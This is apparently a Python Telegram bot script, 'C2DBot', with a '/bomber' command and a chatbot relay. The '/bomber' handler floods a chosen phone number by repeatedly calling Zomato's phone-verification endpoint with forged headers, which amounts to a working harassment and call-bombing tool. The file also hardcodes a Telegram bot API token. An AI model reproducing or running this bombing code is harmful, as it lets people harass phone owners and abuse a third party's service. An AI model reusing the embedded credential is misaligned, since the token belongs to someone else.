#!/usr/bin/python
import time
import subprocess
import os
os.system("pip install -r requirements.txt")
import telepot
import os
import requests
from selenium import webdriver
global i
global chat
global driver
global hist
def handle(msg):
        global i
        global chat
        global driver
        global hist
        chat_id = msg['chat']['id']
        command = msg['text']
        print ("Got Command : %s " %command)
        if(i==0):
            bot.sendMessage(chat_id,'\xF0\x9F\x98\x81 Welcome to -+ C2DBot v1.0 +- (http://c2dunited.ml/) \xE2\x9C\x94')
            i=1
        #welcome screen and help
        if(command.startswith('help') or command.startswith('/start')):
                bot.sendMessage(chat_id,'\xF0\x9F\x98\x9A HELP MENU: ')
                bot.sendMessage(chat_id,'1. Call bomber : /bomber number')
                bot.sendMessage(chat_id,'2. Chatbot : /chatbot for start /exit for end')
                return 0
                #end welcome
        if(command[0:1]!='/'):
            op=msg['text']
            #print(op,hist)
            if(chat=="ON"):
                if(op==hist):
                    while(op!=hist):
                        time.sleep(0.5)
                #while(1):
                box=driver.find_element_by_class_name('stimulus')
                box.send_keys(op)
                if(op=="exit"):
                    al=("Exitting chatbot")
                    bot.sendMessage(chat_id,al)
                    chat="OFF"
                button=driver.find_element_by_class_name('sayitbutton')
                button.click()
                time.sleep(7)
                inp=driver.find_element_by_id('line1')
                al=(inp.text)
                bot.sendMessage(chat_id,al)
                hist=op
                    
        if(command.startswith('/bomber')):
            bot.sendMessage(chat_id,'\xF0\x9F\x98\x88 [+] Got Command \xF0\x9F\x98\x88')
            bot.sendMessage(chat_id,command)
            bot.sendMessage(chat_id,'\xF0\x9F\x92\xBB  [-] Wait.....[-]')
            #aa=subprocess.check_output(("python bomber.py"),shell=True)
            url="https://www.zomato.com/php/o2_handler.php"
            no=(command[8:18])
            rep=int(command[19:21].strip())
            if(rep>=8 or str(rep)==""):
               rep=5
            header = {'Host': 'www.zomato.com',"Origin": "http://hydra98.000webhostapp.com",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded','Content-Length': '85'}
            para={'case':'verifyphone','phone':no,'verification_type':'email','country_id':'1','res_id':'1234567'}
            for i in range(0,rep):
                call(url,para,header)
                time.sleep(10)
            al=("Done")
            bot.sendMessage(chat_id,al)
        if(command.startswith('/chatbot')):
            chat="ON"
            bot.sendMessage(chat_id,'\xF0\x9F\x98\x88 [+] Got Command \xF0\x9F\x98\x88')
            bot.sendMessage(chat_id,command)
            bot.sendMessage(chat_id,'\xF0\x9F\x92\xBB  [-] Wait.....[-]')
            #aa=subprocess.check_output(("python "+command),shell=True)
            #options = webdriver.ChromeOptions()
            #options.add_argument("headless")
            #driver=webdriver.Chrome('C:\\Users\\ronyg\\Downloads\\chromedriver_win32\\chromedriver.exe',chrome_options=options)
            #driver.get('https://www.eviebot.com/en/')
            #driver=webdriver.Chrome('C:\\Users\\ronyg\\Downloads\\chromedriver_win32\\chromedriver.exe')
            driver=webdriver.PhantomJS('/app/vendor/phantomjs/bin/phantomjs')
            #options = webdriver.ChromeOptions()
            #options.add_argument('--headless')
            #options.add_argument('--no-sandbox')
            #options.add_argument('--disable-setuid-sandbox')
            #options.binary_location = '/app/chrome'
            # get chromedriver from 
            # https://sites.google.com/a/chromium.org/chromedriver/downloads
            #browser = webdriver.Chrome(chrome_options=options, executable_path='/app/driver')
            al=("Launching... it may take upto 20 seconds")
            bot.sendMessage(chat_id,al)
            driver.get('https://www.eviebot.com/en/')
            i=0
            while(i<7):
                print("..", end='')
                time.sleep(1)
                i+=1
            al=("starting")
            bot.sendMessage(chat_id,al)
            inp=driver.find_element_by_id('line1')
            al=(inp.text)
            bot.sendMessage(chat_id,al)
            #bot.sendMessage(chat_id,aa)
def call(url,para,header):
    a=requests.post(url,data=para,headers=header)
#no=input("Enter the 10 digit number")
#api credentials
#api = open('api.txt','r')
api_cont = "680090493:AAH2hskn3pxQB39uViU5SVhgdUfJPZowxrU".strip()
bot = telepot.Bot(api_cont)
bot.message_loop(handle)
i=0
hist=""
chat="OFF"
print ('[+] Server is Listenining [+]')
print ('[=] Type Command from Messenger [=]')

while 1:
        time.sleep(10)
'''
            while(1):
                box=driver.find_element_by_class_name('stimulus')
                box.send_keys(op)
                button=driver.find_element_by_class_name('sayitbutton')
                button.click()
                time.sleep(7)
                inp=driver.find_element_by_id('line1')
                al=(inp.text)
                bot.sendMessage(chat_id,al)
'''
